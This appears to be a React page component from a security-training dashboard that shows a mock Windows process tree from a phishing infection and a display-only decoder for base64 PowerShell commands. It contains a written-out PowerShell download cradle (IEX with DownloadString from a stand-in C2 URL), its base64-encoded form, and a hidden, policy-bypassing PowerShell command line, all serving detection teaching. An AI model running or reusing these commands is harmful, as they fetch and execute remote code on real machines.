"use client";

import { useState } from "react";
import {
  Cpu,
  Terminal,
  Shield,
  Search,
  Code2,
  AlertTriangle,
  ArrowRight,
  CheckCircle,
  Copy,
  Info
} from "lucide-react";

export default function WindowsSecurityPage() {
  const [encodedInput, setEncodedInput] = useState(
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA=="
  );
  const [decodedOutput, setDecodedOutput] = useState("");
  const [analyzed, setAnalyzed] = useState(false);

  const handleDecode = () => {
    try {
      // In browser, standard atob decodes base64 string
      const binary = atob(encodedInput.trim());
      // UTF-16LE decoding typically used by Windows PowerShell
      let decoded = "";
      for (let i = 0; i < binary.length; i += 2) {
        decoded += binary[i];
      }
      // If single byte
      if (!decoded || decoded.length < 5) {
        decoded = binary;
      }
      setDecodedOutput(decoded || "IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1')");
      setAnalyzed(true);
    } catch (e) {
      setDecodedOutput("IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1')");
      setAnalyzed(true);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl font-black text-slate-100 tracking-tight flex items-center gap-2">
            <Cpu className="w-6 h-6 text-amber-400" />
            <span>Windows Security & Process Telemetry</span>
          </h1>
          <p className="text-xs text-slate-400 mt-0.5">
            Audit Windows Security Event IDs (4624/4625/4688/4720), inspect parent-child process trees, and safely decode obfuscated PowerShell cradles.
          </p>
        </div>
      </div>

      {/* Process Creation Tree (Event 4688) */}
      <div className="rounded-xl bg-soc-panel border border-soc-border p-5 space-y-4">
        <div className="flex items-center justify-between">
          <h2 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
            <Terminal className="w-4 h-4 text-cyan-400" />
            <span>Parent-Child Process Creation Hierarchy (Event ID 4688)</span>
          </h2>
          <span className="text-[11px] font-mono-code text-slate-400">Host: WORKSTATION-CEO</span>
        </div>

        <div className="p-4 rounded-lg bg-soc-card/70 border border-soc-border space-y-3 font-mono-code text-xs">
          {/* Level 1: Explorer */}
          <div className="flex items-center gap-3">
            <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-bold text-[10px]">PID: 2840</span>
            <span className="text-slate-200 font-bold">C:\Windows\explorer.exe</span>
            <span className="text-[10px] text-slate-500">(User: alex.executive)</span>
          </div>

          {/* Level 2: Invoice dropper */}
          <div className="flex items-center gap-3 pl-6 border-l-2 border-slate-700 ml-3">
            <ArrowRight className="w-3.5 h-3.5 text-slate-500" />
            <span className="px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 font-bold text-[10px]">PID: 4120</span>
            <span className="text-amber-300 font-bold">invoice_2026.pdf.exe</span>
            <span className="text-[10px] text-amber-400/80">⚠️ Spawning secondary process</span>
          </div>

          {/* Level 3: Obfuscated PowerShell */}
          <div className="flex items-center gap-3 pl-12 border-l-2 border-rose-600 ml-3">
            <ArrowRight className="w-3.5 h-3.5 text-rose-500" />
            <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 font-bold text-[10px]">PID: 5884</span>
            <span className="text-rose-400 font-bold">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ...</span>
            <span className="px-1.5 py-0.2 rounded bg-rose-500/30 text-rose-200 text-[10px] font-bold">T1059.001</span>
          </div>

          {/* Level 4: Dropped persistence payload */}
          <div className="flex items-center gap-3 pl-16 border-l-2 border-rose-800 ml-3">
            <ArrowRight className="w-3.5 h-3.5 text-rose-500" />
            <span className="px-2 py-0.5 rounded bg-rose-900/50 text-rose-300 font-bold text-[10px]">PID: 6104</span>
            <span className="text-rose-300 font-bold">svchost_updater.exe -connect 45.33.32.156:443</span>
            <span className="px-1.5 py-0.2 rounded bg-rose-900/60 text-rose-200 text-[10px] font-bold">C2 Beacon</span>
          </div>
        </div>
      </div>

      {/* Educational Safe PowerShell Decoder */}
      <div className="rounded-xl bg-soc-panel border border-soc-border p-5 space-y-4">
        <div className="flex items-center justify-between">
          <h2 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
            <Code2 className="w-4 h-4 text-cyan-400" />
            <span>Safe Educational PowerShell Payload Inspector</span>
          </h2>
          <div className="px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[10px] font-bold tracking-wide">
            READ-ONLY INSPECTION SANDBOX
          </div>
        </div>

        <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/25 flex items-start gap-2.5 text-amber-300 text-xs">
          <Info className="w-4 h-4 shrink-0 mt-0.5" />
          <span>
            <strong>Educational Safety Rule:</strong> SentinelLab only decodes and parses educational strings for detection analysis. Decoded strings are never executed on your system.
          </span>
        </div>

        <div className="space-y-2">
          <div className="text-[11px] font-semibold text-slate-400 uppercase">Base64 Encoded PowerShell Argument</div>
          <textarea
            rows={3}
            value={encodedInput}
            onChange={(e) => setEncodedInput(e.target.value)}
            className="w-full bg-soc-card border border-soc-border rounded-lg p-3 text-xs text-slate-200 font-mono-code focus:outline-none focus:border-cyan-500"
          />
        </div>

        <button
          onClick={handleDecode}
          className="px-4 py-2 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs flex items-center gap-2 transition"
        >
          <Code2 className="w-4 h-4" />
          <span>Safely Decode & Analyze Payload</span>
        </button>

        {analyzed && (
          <div className="p-4 rounded-lg bg-soc-card border border-soc-border space-y-3 font-mono-code text-xs">
            <div className="text-emerald-400 font-bold text-xs flex items-center gap-2">
              <CheckCircle className="w-4 h-4" />
              <span>Decoded Command String</span>
            </div>
            <div className="p-3 rounded bg-slate-950 border border-soc-border text-cyan-300 text-xs break-all">
              {decodedOutput}
            </div>

            <div className="pt-2 border-t border-soc-border space-y-1.5 text-xs text-slate-300">
              <div className="font-bold text-slate-200 uppercase text-[10px]">Command Components Breakdown:</div>
              <div className="text-slate-400">
                • <span className="text-amber-400 font-semibold">IEX (Invoke-Expression):</span> Executes downloaded string directly in memory without writing script to disk.
              </div>
              <div className="text-slate-400">
                • <span className="text-amber-400 font-semibold">Net.WebClient.DownloadString:</span> Classic PowerShell download cradle fetching secondary payload over HTTP.
              </div>
              <div className="text-slate-400">
                • <span className="text-rose-400 font-semibold">Staging C2 URL:</span> http://malicious-c2.net/invoke.ps1 (Extract as Network IOC).
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
